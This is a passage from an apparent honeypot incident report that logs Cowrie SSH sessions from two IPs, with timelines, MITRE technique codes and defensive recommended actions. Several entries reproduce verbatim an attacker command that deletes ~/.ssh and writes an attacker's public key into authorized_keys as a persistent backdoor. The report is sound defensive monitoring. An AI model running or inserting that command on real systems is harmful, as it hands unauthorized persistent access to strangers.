**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b02e99a317a

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:34 |
| **Last Seen** | 2026-05-26 07:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:34:00` | `cowrie.session.connect` |
| `2026-05-26 07:34:00` | `cowrie.client.version` |
| `2026-05-26 07:34:00` | `cowrie.client.kex` |
| `2026-05-26 07:34:01` | `cowrie.login.success` |
| `2026-05-26 07:34:01` | `cowrie.session.params` |
| `2026-05-26 07:34:01` | `cowrie.command.input` |
| `2026-05-26 07:34:01` | `cowrie.command.failed` |
| `2026-05-26 07:34:01` | `cowrie.log.closed` |
| `2026-05-26 07:34:02` | `cowrie.session.params` |
| `2026-05-26 07:34:02` | `cowrie.command.input` |
| `2026-05-26 07:34:02` | `cowrie.session.file_download` |
| `2026-05-26 07:34:02` | `cowrie.log.closed` |
| `2026-05-26 07:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9576bcdbbbbb

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:34 |
| **Last Seen** | 2026-05-26 07:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:34:05` | `cowrie.session.connect` |
| `2026-05-26 07:34:05` | `cowrie.client.version` |
| `2026-05-26 07:34:05` | `cowrie.client.kex` |
| `2026-05-26 07:34:06` | `cowrie.login.success` |
| `2026-05-26 07:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb8381fdd498

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:34 |
| **Last Seen** | 2026-05-26 07:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:34:10` | `cowrie.session.connect` |
| `2026-05-26 07:34:10` | `cowrie.client.version` |
| `2026-05-26 07:34:10` | `cowrie.client.kex` |
| `2026-05-26 07:34:11` | `cowrie.login.success` |
| `2026-05-26 07:34:11` | `cowrie.session.params` |
| `2026-05-26 07:34:11` | `cowrie.command.input` |
| `2026-05-26 07:34:11` | `cowrie.command.failed` |
| `2026-05-26 07:34:11` | `cowrie.log.closed` |
| `2026-05-26 07:34:12` | `cowrie.session.params` |
| `2026-05-26 07:34:12` | `cowrie.command.input` |
| `2026-05-26 07:34:12` | `cowrie.session.file_download` |
| `2026-05-26 07:34:12` | `cowrie.log.closed` |
| `2026-05-26 07:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4d17afabdb

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:34 |
| **Last Seen** | 2026-05-26 07:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:34:14` | `cowrie.session.connect` |
| `2026-05-26 07:34:14` | `cowrie.client.version` |
| `2026-05-26 07:34:14` | `cowrie.client.kex` |
| `2026-05-26 07:34:15` | `cowrie.login.success` |
| `2026-05-26 07:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afdb61f654eb

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:34 |
| **Last Seen** | 2026-05-26 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:34:57` | `cowrie.session.connect` |
| `2026-05-26 07:34:57` | `cowrie.client.version` |
| `2026-05-26 07:34:57` | `cowrie.client.kex` |
| `2026-05-26 07:34:57` | `cowrie.login.success` |
| `2026-05-26 07:34:58` | `cowrie.session.params` |
| `2026-05-26 07:34:58` | `cowrie.command.input` |
| `2026-05-26 07:34:58` | `cowrie.command.failed` |
| `2026-05-26 07:34:58` | `cowrie.log.closed` |
| `2026-05-26 07:34:58` | `cowrie.session.params` |
| `2026-05-26 07:34:58` | `cowrie.command.input` |
| `2026-05-26 07:34:58` | `cowrie.session.file_download` |
| `2026-05-26 07:34:58` | `cowrie.log.closed` |
| `2026-05-26 07:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d794a0b1bf3

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:35 |
| **Last Seen** | 2026-05-26 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:35:01` | `cowrie.session.connect` |
| `2026-05-26 07:35:01` | `cowrie.client.version` |
| `2026-05-26 07:35:01` | `cowrie.client.kex` |
| `2026-05-26 07:35:01` | `cowrie.login.success` |
| `2026-05-26 07:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94865e14b9a8

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:35 |
| **Last Seen** | 2026-05-26 07:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:35:12` | `cowrie.session.connect` |
| `2026-05-26 07:35:12` | `cowrie.client.version` |
| `2026-05-26 07:35:12` | `cowrie.client.kex` |
| `2026-05-26 07:35:13` | `cowrie.login.success` |
| `2026-05-26 07:35:13` | `cowrie.session.params` |
| `2026-05-26 07:35:13` | `cowrie.command.input` |
| `2026-05-26 07:35:13` | `cowrie.command.failed` |
| `2026-05-26 07:35:14` | `cowrie.log.closed` |
| `2026-05-26 07:35:14` | `cowrie.session.params` |
| `2026-05-26 07:35:14` | `cowrie.command.input` |
| `2026-05-26 07:35:14` | `cowrie.session.file_download` |
| `2026-05-26 07:35:14` | `cowrie.log.closed` |
| `2026-05-26 07:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb261c78c2f8

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:35 |
| **Last Seen** | 2026-05-26 07:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:35:17` | `cowrie.session.connect` |
| `2026-05-26 07:35:17` | `cowrie.client.version` |
| `2026-05-26 07:35:17` | `cowrie.client.kex` |
| `2026-05-26 07:35:18` | `cowrie.login.success` |
| `2026-05-26 07:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d328a936e294

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:35 |
| **Last Seen** | 2026-05-26 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:35:43` | `cowrie.session.connect` |
| `2026-05-26 07:35:43` | `cowrie.client.version` |
| `2026-05-26 07:35:43` | `cowrie.client.kex` |
| `2026-05-26 07:35:44` | `cowrie.login.success` |
| `2026-05-26 07:35:44` | `cowrie.session.params` |
| `2026-05-26 07:35:44` | `cowrie.command.input` |
| `2026-05-26 07:35:44` | `cowrie.command.failed` |
| `2026-05-26 07:35:45` | `cowrie.log.closed` |
| `2026-05-26 07:35:45` | `cowrie.session.params` |
| `2026-05-26 07:35:45` | `cowrie.command.input` |
| `2026-05-26 07:35:45` | `cowrie.session.file_download` |
| `2026-05-26 07:35:45` | `cowrie.log.closed` |
| `2026-05-26 07:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790a42473c6f

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:35 |
| **Last Seen** | 2026-05-26 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:35:47` | `cowrie.session.connect` |
| `2026-05-26 07:35:47` | `cowrie.client.version` |
| `2026-05-26 07:35:47` | `cowrie.client.kex` |
| `2026-05-26 07:35:48` | `cowrie.login.success` |
| `2026-05-26 07:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a42f43547a

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:36 |
| **Last Seen** | 2026-05-26 07:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:36:26` | `cowrie.session.connect` |
| `2026-05-26 07:36:26` | `cowrie.client.version` |
| `2026-05-26 07:36:26` | `cowrie.client.kex` |
| `2026-05-26 07:36:27` | `cowrie.login.success` |
| `2026-05-26 07:36:27` | `cowrie.session.params` |
| `2026-05-26 07:36:27` | `cowrie.command.input` |
| `2026-05-26 07:36:28` | `cowrie.command.failed` |
| `2026-05-26 07:36:28` | `cowrie.log.closed` |
| `2026-05-26 07:36:28` | `cowrie.session.params` |
| `2026-05-26 07:36:28` | `cowrie.command.input` |
| `2026-05-26 07:36:28` | `cowrie.session.file_download` |
| `2026-05-26 07:36:28` | `cowrie.log.closed` |
| `2026-05-26 07:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-789d175a92ed

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:36 |
| **Last Seen** | 2026-05-26 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:36:31` | `cowrie.session.connect` |
| `2026-05-26 07:36:31` | `cowrie.client.version` |
| `2026-05-26 07:36:31` | `cowrie.client.kex` |
| `2026-05-26 07:36:32` | `cowrie.login.success` |
| `2026-05-26 07:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e8a244c7cbe

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:36 |
| **Last Seen** | 2026-05-26 07:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:36:33` | `cowrie.session.connect` |
| `2026-05-26 07:36:33` | `cowrie.client.version` |
| `2026-05-26 07:36:34` | `cowrie.client.kex` |
| `2026-05-26 07:36:34` | `cowrie.login.success` |
| `2026-05-26 07:36:35` | `cowrie.session.params` |
| `2026-05-26 07:36:35` | `cowrie.command.input` |
| `2026-05-26 07:36:35` | `cowrie.command.failed` |
| `2026-05-26 07:36:35` | `cowrie.log.closed` |
| `2026-05-26 07:36:35` | `cowrie.session.params` |
| `2026-05-26 07:36:35` | `cowrie.command.input` |
| `2026-05-26 07:36:35` | `cowrie.session.file_download` |
| `2026-05-26 07:36:35` | `cowrie.log.closed` |
| `2026-05-26 07:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9c8b4fae89d

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:36 |
| **Last Seen** | 2026-05-26 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:36:37` | `cowrie.session.connect` |
| `2026-05-26 07:36:37` | `cowrie.client.version` |
| `2026-05-26 07:36:37` | `cowrie.client.kex` |
| `2026-05-26 07:36:38` | `cowrie.login.success` |
| `2026-05-26 07:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e5414d45681

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:37 |
| **Last Seen** | 2026-05-26 07:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:37:20` | `cowrie.session.connect` |
| `2026-05-26 07:37:20` | `cowrie.client.version` |
| `2026-05-26 07:37:21` | `cowrie.client.kex` |
| `2026-05-26 07:37:21` | `cowrie.login.success` |
| `2026-05-26 07:37:22` | `cowrie.session.params` |
| `2026-05-26 07:37:22` | `cowrie.command.input` |
| `2026-05-26 07:37:22` | `cowrie.command.failed` |
| `2026-05-26 07:37:22` | `cowrie.log.closed` |
| `2026-05-26 07:37:22` | `cowrie.session.params` |
| `2026-05-26 07:37:22` | `cowrie.command.input` |
| `2026-05-26 07:37:22` | `cowrie.session.file_download` |
| `2026-05-26 07:37:22` | `cowrie.log.closed` |
| `2026-05-26 07:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfd98f5292ca

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:37 |
| **Last Seen** | 2026-05-26 07:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:37:24` | `cowrie.session.connect` |
| `2026-05-26 07:37:24` | `cowrie.client.version` |
| `2026-05-26 07:37:25` | `cowrie.client.kex` |
| `2026-05-26 07:37:25` | `cowrie.login.success` |
| `2026-05-26 07:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cab5aec0d3d

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:38 |
| **Last Seen** | 2026-05-26 07:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
